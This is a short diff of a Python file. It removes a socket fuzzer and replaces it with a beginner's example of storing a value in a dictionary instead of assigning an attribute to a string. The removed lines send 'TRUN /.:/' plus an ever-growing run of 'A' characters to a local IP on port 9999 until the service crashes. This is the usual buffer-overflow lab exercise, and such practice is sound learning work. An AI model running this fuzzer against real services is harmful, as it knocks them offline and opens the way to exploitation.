@@ -1,17 +1,10 @@
+x = "man"
+# Attempting to assign an attribute to a string object will raise an AttributeError
+# x.man = "hekki" 
 
-import sys, socket
-from time import sleep
+# Instead, you could create a dictionary and assign values to keys
+x_dict = {}
+x_dict['man'] = "hekki"
 
-buffer = "A" * 100
-while True:
-
-    try:
-        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect(('192.168.60.136', 9999))
-        s.send(('TRUN /.:/' + buffer))
-        s.close()
-        sleep(1)
-        buffer = buffer + "A" * 100
-    except:
-        print("server crashed at %s bytes" % str(len(buffer)))
-        sys.exit()
+# Now you can access the value associated with the 'man' key
+print(x_dict['man'])  # Output will be 'hekki'
